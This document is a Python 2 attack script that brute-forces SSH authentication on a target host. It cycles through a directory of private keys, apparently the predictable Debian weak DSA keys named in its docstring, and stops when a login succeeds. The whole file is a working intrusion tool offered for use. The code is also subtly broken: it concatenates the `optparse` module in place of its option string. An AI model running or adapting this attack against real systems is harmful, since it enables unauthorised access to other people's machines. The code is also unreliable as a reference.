"""
To use this script properly you will have to google for debian_
ssh_dsa_1024_x86.tar.bz2 package.
"""

import pexpect
import optparse
import os
from threading import *

MAX_CONNECTIONS = 5
connection_lock = BoundedSemaphore(MAX_CONNECTIONS)
stop = False
fails = 0


def connect(user, host, keyfile, release):
    global stop
    global fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        conn_str = 'ssh ' + user + '@' + host + ' -i ' + keyfile + optparse
        child = pexpect.spawn(conn_str)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey,
                            conn_closed, '$', '#'])
        if ret == 2:
            print '[-] Adding host to: ~/.ssh/known_hosts'
            child.sendline('yes')
            connect(user, host, keyfile, False)
        elif ret == 3:
            print '[-] Connection closed by remote host'
            fails += 1
        elif ret > 3:
            print '[+] Success. ' + str(keyfile)
            stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser('Usage %prog -H <target host>'
                                   '-u <user> -d <directory>')
    parser.add_option('-H', dest='tgt_host', type='string',
                      help='specify target host')
    parser.add_option('-d', dest='pass_dir', type='string',
                      help='specify directory with keys')
    parser.add_option('-u', dest='user', type='string',
                      help='specify username')
    (options, args) = parser.parse_args()
    host = options.tgt_host
    dir = options.pass_dir
    user = options.user
    if host == None or dir == None or user == None:
        print parser.usage
        exit(0)
    for filename in os.listdir(dir):
        if stop:
            print '[*] Exiting: key found.'
            exit(0)
        if fails > 5:
            print '[!] Exiting! Too many connection closed by remote host.'
            print '[!] Adjust number of simultaneous threads.'
            exit(0)
        connection_lock.acquire()
        fullpath = os.path.join(dir, filename)
        print '[-] Testing keyfile ' + str(fullpath)
        t = Thread(target=connect, args=(user, host, fullpath, True))
        child = t.start()


if __name__ == "__main__":
    main()